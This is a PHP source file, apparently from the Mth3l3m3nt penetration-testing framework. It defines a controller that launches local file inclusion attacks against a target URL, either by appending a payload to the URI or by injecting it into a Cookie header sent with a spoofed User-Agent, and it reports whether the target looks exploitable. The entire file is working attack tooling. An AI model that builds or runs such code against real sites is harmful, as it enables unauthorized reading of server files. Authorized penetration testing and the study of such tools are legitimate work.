<?php
/**
 Purpose: Handles URI and Cookie Based LFI Attacks
    
    Copyright (c) 2015 ~ alienwithin
    Munir Njiru <munir@skilledsoft.com>
 
        @version 1.0.0
        @date: 30.06.2015
        @url : http://munir.skilledsoft.com
 **/
namespace Controller;
class Larfi extends Mth3l3m3nt{
	
public function uri_based_lfi($blankurl, $url, $payload){
		$web=\Web::instance();
		$f3=\Base::instance();
		$audit_instance = \Audit::instance();
		if($f3->get('VERB') == 'POST') {
			$error = false;
			if($blankurl) {
				$error=true;
				\Flash::instance()->addMessage('Please enter a url e.g. http://africahackon.com','warning');
			} else {
				$audited_url=$audit_instance->url($url);
				if ($audited_url==TRUE){
					$url=rtrim($url,"/");
					$request_successful=$web->request($url.$payload);
					 if (!($request_successful)){
				    	\Flash::instance()->addMessage('You have entered an invalid URL try something like: http://africahackon.com','warning');
					}
					else{
							$result_body=$request_successful['body'];
					    	$result_headers=$request_successful['headers'];
					    	$response_header=$result_headers["0"];
					    	$engine=$request_successful['engine'];
					    	$headers_max=implode("\n",$result_headers);
						if (strpos($response_header,'200 OK') !== false) {
						  	
							$myFinalRequest="Headers: \n\n".$headers_max."\n\n Body:\n\n".$result_body."\n\n Engine Used: ".$engine;
							$this->response->data['content']=$myFinalRequest;
						}
						else {
							$this->response->data['content']= "Not Exploitable Application Returned the response below: \n\n ".$headers_max;
						}
						//convert array header to string
						
					}
					
				}
				else{
					\Flash::instance()->addMessage('You have entered an invalid URL try something like: http://africahackon.com','danger');
				}
				
			}
		}
			
	}
	public function cookie_based_lfi($method, $blankurl, $url, $payload){
		$web=\Web::instance();
		$f3=\Base::instance();
		$options = array(
		    'method'  => $method,
		    'header' => array(
			     'Accept: */*',
				 'User-Agent: Mth3l3m3ntFramework/4.0 (compatible; MSIE 6.0; HackingtoshTuxu 4.0; .NET CLR 1.1.4322)', 
				 'Cookie: '.$payload, 
				 'Connection: Close',
				 'Pragma: no-cache',
				 'Cache-Control: no-cache'
		    )
		);

		$audit_instance = \Audit::instance();
		if($f3->get('VERB') == 'POST') {
			$error = false;
			if($blankurl) {
				$error=true;
				\Flash::instance()->addMessage('Please enter a url e.g. http://africahackon.com','warning');
			} else {
				$audited_url=$audit_instance->url($url);
				if ($audited_url==TRUE){
					
					$request_successful=$web->request($url,$options);
					 if (!($request_successful)){
				    	\Flash::instance()->addMessage('You have entered an invalid URL try something like: http://africahackon.com','warning');
					}
					else{
							$result_body=$request_successful['body'];
					    	$result_headers=$request_successful['headers'];
					    	$response_header=$result_headers["0"];
					    	$engine=$request_successful['engine'];
					    	$headers_max=implode("\n",$result_headers);
						if (strpos($response_header,'200 OK') !== false) {
						  	
							$myFinalRequest="Headers: \n\n".$headers_max."\n\n Body:\n\n".$result_body."\n\n Engine Used: ".$engine;
							$this->response->data['content']=$myFinalRequest;
						}
						else {
							$this->response->data['content']= "Not Exploitable Application Returned the response below: \n\n ".$headers_max;
						}
						//convert array header to string
						
					}
					
				}
				else{
					\Flash::instance()->addMessage('You have entered an invalid URL try something like: http://africahackon.com','danger');
				}
				
			}
		}
			
	}
}